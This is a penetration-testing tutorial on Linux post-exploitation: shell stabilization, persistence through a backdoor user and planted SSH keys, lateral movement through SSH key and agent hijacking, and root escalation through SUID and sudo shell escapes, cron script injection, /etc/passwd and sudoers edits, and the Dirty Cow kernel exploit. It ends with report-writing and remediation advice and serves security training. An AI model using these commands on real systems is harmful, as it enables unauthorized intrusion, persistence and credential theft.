Author: Azariya Chombe
Focus: Initial Access → RCE → Lateral Movement → Privilege Escalation → Report Writing
Target: Red Teams, Penetration Testers, Security Enthusiasts

Table of Contents
Terminology & Mindset

Initial Access & RCE – You're In, Now What?

Lateral Movement – Moving Through the Network

Privilege Escalation – Becoming Root on Linux

Report Writing for Red Teams & Pentesters

1. Terminology & Mindset
What is Initial Access?
The first door you walk through. Could be:

A phishing email that got a session

A stolen SSH key

A leaked credential from a breach

A vulnerable web application (SQLi, file upload, etc.)

What is RCE (Remote Code Execution)?
RCE means you executed a command on their machine without having a shell first.

Example: You find a vulnerable web endpoint and type ; whoami — and the server responds with www-data.

Important: RCE is not the end goal. RCE is the engagement's permission slip to go deeper. Without RCE, you have no foothold.

What is Privilege Escalation?
Going from a low-privileged user (e.g., www-data, ubuntu, tomcat) to a higher-privileged user (usually root).

Type	Description
Vertical	Low user → higher user (e.g., www-data → root)
Horizontal	User A → User B (same privilege level, different account)
What is Lateral Movement?
Moving from the first compromised machine to other machines on the same network. You pivot, you jump, you spread.

2. Initial Access & RCE – You're In, Now What?
So you got RCE. Your shell is ugly, unstable, and might die any second. Here's what to do immediately.

Step 1: Stabilize Your Shell
That reverse shell that breaks when you press Ctrl+C? Fix it.

bash
# Spawn a proper TTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background the shell (Ctrl+Z)
stty raw -echo; fg
export TERM=xterm
Now you can:

Use arrow keys

Run su and sudo

Use text editors like vim or nano

Step 2: Enumerate Your Surroundings
Ask these questions immediately:

bash
whoami          # Who am I?
id              # What groups am I in?
hostname        # Which machine is this?
uname -a        # What kernel version?
ifconfig -a     # What's the network look like?
Step 3: Establish Persistence (If Allowed)
Check your rules of engagement first. If persistence is allowed:

bash
# Add your SSH key
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys

# Or create a backdoor user
useradd -m -s /bin/bash backdoor
echo "backdoor:password123" | chpasswd
3. Lateral Movement – Moving Through the Network
You have one machine. Now find others.

Method 1: SSH Key Harvesting
People reuse SSH keys everywhere.

bash
# Find private keys
find /home -name "id_rsa" -o -name "id_ed25519" 2>/dev/null

# Test if the key has an empty passphrase
ssh-keygen -y -P "" -f /path/to/id_rsa
If it works: Try the key on other IPs in the same subnet.

Method 2: SSH Agent Hijacking
If someone is logged in and using SSH agent forwarding:

bash
# Find the agent socket
ls -la /tmp/ssh-*

# Use it
export SSH_AUTH_SOCK=/tmp/ssh-xxxxx/agent.12345
ssh-add -l              # List their loaded keys
ssh user@other-box      # Jump without a password
Method 3: Bash History Mining
You'd be surprised what people type.

bash
cat ~/.bash_history | grep -iE "ssh|pass|token|key"
Real example found in the wild:

text
ssh admin@10.0.0.23 -p 2222
password: SuperSecret2024!
Method 4: Pivoting with SOCKS Proxy
Turn the compromised host into a proxy to scan internal networks.

bash
# On your attacking machine
ssh -D 1080 user@compromised-host

# Now use proxychains
proxychains nmap -sT -Pn 10.0.0.0/24
4. Privilege Escalation – Becoming Root on Linux
This is the core of the guide. These are the 5 most common ways to go from a normal user to root.

4.1 SUID Binaries – "Why Does This Run as Root?"
What is SUID?
A special permission that makes a program run as its owner (usually root), even when a normal user launches it.

Find all SUID binaries:

bash
find / -perm -4000 -type f 2>/dev/null
Dangerous SUID binaries and how to exploit them:

Binary	Exploit Command
find	find . -exec /bin/sh \; -quit
vim / nvim	vim -c ':!/bin/sh'
bash	bash -p
cp	Copy /etc/shadow to a readable location
nano	Open nano → ^R → ^X → reset; sh 1>&0 2>&0
Example walkthrough (find):

bash
$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/find   <-- SUID bit set

$ find . -exec /bin/sh \; -quit
# id
uid=0(root) gid=0(root) groups=0(root)
4.2 Sudo Misconfigurations – "You Let Me Run WHAT?"
Check what commands you can run with sudo:

bash
sudo -l
If you see anything that can spawn a shell, you win.

Dangerous sudo right	Why	Exploit
find	Can execute anything	sudo find . -exec /bin/sh \;
vim / nano	Can spawn shell	sudo vim -c ':!/bin/sh'
less / more	Can spawn shell	sudo less /etc/passwd → !/bin/sh
python / perl / php	Full language interpreter	sudo python -c 'import pty;pty.spawn("/bin/sh")'
systemctl	Can create root services	Write malicious service → enable → start
awk	Command execution	sudo awk 'BEGIN {system("/bin/sh")}'
4.3 Cron Jobs – Scheduled Tasks Running as Root
What are cron jobs?
Tasks that run automatically at specific times, often as root.

Find them:

bash
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/
Exploitation: If a script run by root is writable by you:

bash
# Add a reverse shell or privilege escalation
echo "chmod 4777 /bin/bash" >> /etc/cron.hourly/backup.sh

# Wait for cron to run (max 1 hour)
# Then:
/bin/bash -p   # Root shell
4.4 Weak File Permissions – "They Left the Keys Under the Mat"
Case 1: Readable /etc/shadow

bash
cat /etc/shadow
# Copy the root hash, crack offline with John or Hashcat
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Case 2: Writable /etc/passwd

bash
# Generate a password hash
openssl passwd -1 -salt abc mypassword

# Add a new root user (notice the 0:0 UID/GID)
echo "hacker:$hash:0:0:root:/root:/bin/bash" >> /etc/passwd

# Switch to your new root user
su hacker
Case 3: Writable /etc/sudoers (rare but game over)

bash
echo "youruser ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
sudo -i
4.5 Kernel Exploits – The Nuclear Option
When nothing else works, the kernel itself might be buggy.

Check your kernel:

bash
uname -a
cat /etc/os-release
Search for exploits:

text
Google: "Linux kernel 3.13.0 exploit"
Search Exploit-DB: searchsploit linux 3.13
Famous example – Dirty Cow (CVE-2016-5195):

bash
# Download exploit, compile, run
gcc -pthread dirtycow.c -o dirtycow
./dirtycow
su firefart   # New root user created
Warning: Kernel exploits can crash the machine. Only use when other methods fail and you have permission.

Quick Privilege Escalation Checklist
Run these commands on any Linux box you land on:

bash
# SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Sudo rights
sudo -l

# Cron jobs
cat /etc/crontab 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc

# SSH keys
find / -name "id_rsa" 2>/dev/null

# Passwords in configs
grep -r "password" /var/www/ 2>/dev/null
5. Report Writing for Red Teams & Pentesters
You found the holes. Now you have to write about it. Clients don't want 200 pages of commands. They want answers.

The 4 Sections Every Report Must Have
1. Executive Summary (For Managers)
Keep it short. No IPs. No commands. Just business impact.

Example:
"An attacker with low-privileged access could escalate to root in under 5 minutes due to a misconfigured SUID binary. This would allow full compromise of the system, including customer data and credentials."

2. Technical Findings (For Sysadmins)
Use this table format for each finding:

Field	Content
Title	"SUID Binary Misconfiguration – /usr/bin/find"
Risk	Critical / High / Medium / Low
Description	One sentence explaining the issue
Evidence	Screenshot or command output
Impact	What an attacker can actually do
Remediation	Exact command to fix it
Reference	MITRE ATT&CK ID (e.g., T1548)
3. Reproduction Steps (For Verification)
Write it like a recipe. A tired admin at 4 PM on Friday should be able to follow it.

Example:

text
1. SSH into the machine as user 'tom'
2. Run: find / -perm -4000 -type f 2>/dev/null
3. Observe that /usr/bin/find has the SUID bit set
4. Run: /usr/bin/find . -exec /bin/sh \; -quit
5. Result: A root shell appears (uid=0)
4. Remediation Timeline (For Planning)
Risk Level	Fix Within	Example
Critical	24-48 hours	SUID on find, writable /etc/passwd
High	1 week	Kernel exploit, weak cron perms
Medium	2-4 weeks	Readable shadow file
Low	Next patch cycle	Information disclosure
What NOT to Put in a Report
- Plaintext passwords you cracked (just say "password recovered")

- Internal IP addresses if the report is public

- Offensive language or jokes (save for team chat)

- Commands without explanation

MITRE ATT&CK Mapping (Red Team Standard)
Finding	MITRE Tactic	Technique ID
SUID abuse	Privilege Escalation	T1548.001
Sudo misconfig	Privilege Escalation	T1548.003
SSH key hijack	Lateral Movement	T1021.004
Cron job abuse	Persistence	T1053.003
Kernel exploit	Privilege Escalation	T1068
 you
